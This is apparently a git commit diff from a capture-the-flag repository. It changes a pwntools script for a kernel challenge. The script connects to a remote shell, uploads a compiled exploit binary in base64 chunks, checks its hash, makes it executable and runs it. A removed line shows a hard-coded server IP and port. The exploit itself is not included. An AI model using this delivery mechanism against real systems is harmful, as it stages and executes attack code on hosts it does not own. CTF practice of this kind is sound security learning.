f2b2d187d3a006e1a58197f2194eb6a5611389cc
Evan Hellman <ehellman@iastate.edu>
2022-11-03 00:09:25 -0400

    Updated delivery mechanism, need to either find more efficient way to send data due to timeout or lnik with correct glibc version.

--- challenges/kernel_adventures_part_1/deliverer.py
+++ challenges/kernel_adventures_part_1/deliverer.py
@@ -1,10 +1,6 @@
 from pwn import *
-import exploit_helper
 
 # Binary filename
-exe = "/bin/netcat"
-server_ip = "178.128.173.79"
-server_port = "31992"
 exploit_path = "cmake-build-debug/exploit"
 
 # Specify GDB script here (breakpoints etc.)
@@ -12,29 +8,55 @@ gdb_script = '''
 piebase
 '''.format(**locals())
 
-# This will automatically get context arch, bits, os etc
-elf = context.binary = ELF(exe, checksec=False)
+io = remote(sys.argv[1], int(sys.argv[2]))
+
+
+def send_command(command: bytes, print_result=True) -> bytes:
+    info(f"Sending command '{command.decode('ascii')}'".encode("ascii"))
+    io.sendline(command)
+
+    result = io.recvuntil(b"$ ")
+    result = result[:result.rfind(b"\n")][len(command)+2:]
+
+    if result != b"" and print_result:
+        info(result)
+
+    return result
+
 
 # ===========================================================
 #                    EXPLOIT GOES HERE
 # ===========================================================
 
-io = exploit_helper.start(exe=exe, gdb_script=gdb_script, argv=[server_ip, server_port])
+# Wait for initial prompt
+io.recvuntil(b"$ ")
 
+# Delivery script
+send_command(b"cd /home/user", print_result=False)
+send_command(b"rm -f exploit exploit.b64", print_result=False)
+send_command(b"touch exploit.b64", print_result=False)
 
-def send_command(command: bytes):
-    info(f"Sending command '{command}'")
-    io.readuntil(b"/ $ ")
-    io.sendline(command)
-
-
+sha256 = hashlib.sha256()
 with open(exploit_path, "rb") as exploit_file:
-    while (data := exploit_file.read(256)) != b"":
+    while (data := exploit_file.read(510)) != b"":
         encoded_data: str = base64.b64encode(data).decode("ascii")
-        send_command(f"echo '{encoded_data}' > exploit".encode("ascii"))
+        send_command(f"echo {encoded_data} >> exploit.b64".encode("ascii"),
+                     print_result=False)
+        sha256.update(data)
 
+# Get hash of local exploit binary
+local_exploit_hash = sha256.hexdigest()
+
+# Prepare exploit for execution
+send_command(b"base64 -d exploit.b64 > exploit")
 send_command(b"chmod +x exploit")
 
-send_command(b"./exploit")
+# Confirm binary was transferred correctly
+remote_exploit_hash_raw = send_command(b"sha256sum exploit", print_result=False)
+remote_exploit_hash = remote_exploit_hash_raw.decode("ascii").split(" ")[0]
+if remote_exploit_hash != local_exploit_hash:
+    error(b"Remote exploit was not transferred correctly.")
+    exit(1)
 
-io.interactive()
+# Execute exploit
+send_command(b"./exploit")
